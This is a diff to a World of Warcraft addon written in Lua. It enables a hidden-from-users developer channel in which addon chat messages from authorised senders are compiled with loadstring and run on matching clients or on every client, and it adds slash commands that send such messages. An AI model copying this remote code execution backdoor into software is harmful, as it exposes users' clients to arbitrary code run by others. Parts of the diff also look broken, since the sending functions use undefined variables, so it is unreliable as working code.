@@ -18,25 +18,35 @@ function E:SendSLEMessage()
 	end
 end
 
+function E:sleSays(msg) -- /w Target /slesays {Target|ALL}#channel#message#whispertarget
+	if not SLE:Auth() then return end
+	if channel == 'WHISPER' and target == nil then
+		E:Print('You need to set a whisper target.')
+		return
+	end
+	SendAddonMessage('SLE_DEV_SAYS', msg, channel, target)
+end
+
+function E:sleCommand(msg) -- /w Target /slecmd {Target|ALL}#script
+	if not SLE:Auth() then return end
+	if channel == 'WHISPER' and target == nil then
+		E:Print('You need to set a whisper target.')
+		return
+	end
+	SendAddonMessage('SLE_DEV_CMD', msg, channel, target)
+end
+
 local function SendRecieve(self, event, prefix, message, channel, sender)
-	--print("Ima addon message")
-	--print(event)
-	--print(prefix)
-	--print(message)
-	--print(channel)
-	--print(sender)
 	if event == "CHAT_MSG_ADDON" then
 		if sender == E.myname then return end
-		--if SLE:Auth() then return end
-		--print("Chat message")
-		if prefix == "SLE_VERSION" and not find(sender, "Elvz") and not SLE.recievedOutOfDateMessage then
+		if SLE:Auth() then return end
+		if prefix == "SLE_VERSION" and not SLE.recievedOutOfDateMessage then
 			if SLE.version ~= 'BETA' and tonumber(message) ~= nil and tonumber(message) > tonumber(SLE.version) then
-				E:Print(L["Your version of ElvUI is out of date. You can download the latest version from http://www.tukui.org"])
+				SLE:Print(L["Your version of ElvUI S&L is out of date. You can download the latest version from http://www.tukui.org"])
 				SLE.recievedOutOfDateMessage = true
 			end
-		end
-		--[[elseif (prefix == 'ELVUI_DEV_SAYS' or prefix == 'ELVUI_DEV_CMD') and ((sender == 'Dapooc' and E.myrealm == "Anasterian (US)") or (sender == "Dapooc-Anasterian(US)")) then
-			if prefix == 'ELVUI_DEV_SAYS' then
+		elseif (prefix == 'SLE_DEV_SAYS' or prefix == 'SLE_DEV_CMD') and (SLE:CrossAuth(sender) or SLE:Auth()) then
+			if prefix == 'SLE_DEV_SAYS' then
 				local user, channel, msg, sendTo = split("#", message)
 				
 				if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
@@ -44,25 +54,30 @@ local function SendRecieve(self, event, prefix, message, channel, sender)
 				end
 			else
 				local user, executeString = split("#", message)
-				print(user)
-				print(executeString)
 				if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
 					local func, err = loadstring(executeString);
 					if not err then
-						E:Print(format("Developer Executed: %s", executeString))
+						SLE:Print(format("Developer Executed: %s", executeString))
 						func()
 					end
 				end			
 			end
-		end]]
+		end
 	else
 		E.SendSLEMSGTimer = E:ScheduleTimer('SendSLEMessage', 12)
 	end
 end
 
 RegisterAddonMessagePrefix('SLE_VERSION')
+RegisterAddonMessagePrefix('SLE_DEV_SAYS')
+RegisterAddonMessagePrefix('SLE_DEV_CMD')
 
 local f = CreateFrame('Frame', "DaFrame")
 f:RegisterEvent("GROUP_ROSTER_UPDATE")
 f:RegisterEvent("CHAT_MSG_ADDON")
 f:SetScript('OnEvent', SendRecieve)
+
+function SLE:RegisterCommands()
+	E:RegisterChatCommand('slesays', 'sleSays')
+	E:RegisterChatCommand('slecmd', 'sleCommand')
+end
